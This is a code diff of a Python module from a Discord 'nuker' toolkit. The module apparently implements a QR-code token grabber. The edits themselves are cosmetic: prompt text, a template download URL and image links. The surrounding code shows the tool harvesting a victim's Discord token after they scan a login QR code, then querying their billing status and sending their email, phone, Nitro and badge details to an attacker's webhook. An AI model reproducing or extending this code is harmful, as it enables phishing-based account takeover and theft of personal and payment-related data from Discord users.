@@ -9,6 +9,7 @@ import sys
 import json
 import base64
 import requests
+
 from PIL import Image
 from time import sleep
 from colorama import Fore
@@ -16,7 +17,6 @@ from zipfile import ZipFile
 from bs4 import BeautifulSoup
 from urllib.request import urlretrieve
 from selenium import webdriver, common
-
 from utilities.Settings.common import getDriver, getheaders, SlowPrint
 
 def logo_qr():
@@ -43,7 +43,7 @@ def QR_Grabber(Webhook):
         except common.exceptions.SessionNotCreatedException as e:
             print(e.msg)
             sleep(2)
-            SlowPrint("Enter anything to continue. . . ")
+            SlowPrint("Enter anything to continue...")
             input()
             spammer()
     elif type_ == "operadriver.exe":
@@ -55,7 +55,7 @@ def QR_Grabber(Webhook):
         except common.exceptions.SessionNotCreatedException as e:
             print(e.msg)
             sleep(2)
-            SlowPrint("Enter anything to continue. . . ")
+            SlowPrint("Enter anything to continue...")
             input()
             spammer()
     elif type_ == "msedgedriver.exe":
@@ -67,13 +67,13 @@ def QR_Grabber(Webhook):
         except common.exceptions.SessionNotCreatedException as e:
             print(e.msg)
             sleep(2)
-            SlowPrint(f"Enter anything to continue. . .")
+            SlowPrint(f"Enter anything to continue...")
             input()
             spammer()
     else:
         print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Coudln\'t find a driver to create a QR code with')
         sleep(3)
-        print("Enter anything to continue. . . ", end="")
+        print("Enter anything to continue... ", end="")
         input()
         spammer()
 
@@ -92,7 +92,7 @@ def QR_Grabber(Webhook):
     SlowPrint(f"\n{Fore.WHITE}Downloading QR Templates!")
 
     urlretrieve(
-        "https://github.com/TT-Tutorials/addons/raw/main/GANG-Nuker%20Addons/QR-Code.zip",
+        "https://github.com/TT-Tutorials/addons/blob/main/QR-Code.zip?raw=true",
         filename="QR-Code.zip",
     )
     with ZipFile("QR-Code.zip", 'r')as zip2:
@@ -164,13 +164,13 @@ def QR_Grabber(Webhook):
             billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token)).text)) > 0)
 
             embed = {
-                "avatar_url":"https://media.discordapp.net/attachments/878154522978029582/917679300705124412/a4235fd1da45633adbc305450741b506.png",
+                "avatar_url":"https://cdn.discordapp.com/attachments/1017976609669644373/1035321413093040248/GANG.png",
                 "embeds": [
                     {
                         "author": {
                             "name": "GANG-Nuker | QR Token Grabber",
                             "url": "https://github.com/TT-Tutorials/GANG-Nuker",
-                            "icon_url": "https://cdn.discordapp.com/attachments/982965691093254154/994193135213228092/GANGGRABBER.gif"
+                            "icon_url": "https://cdn.discordapp.com/attachments/1017976609669644373/1035321413093040248/GANG.png"
                         },
                         "description": f"**{user}** Just Scanned the QR Code!\n**[Avatar]({url})**\n\n**Email:** {email}\n**Phone:** {phone}\n**Billing:** {billing}\n**Nitro:** {has_nitro}\n**Badges:** {badges}",
                         "fields": [
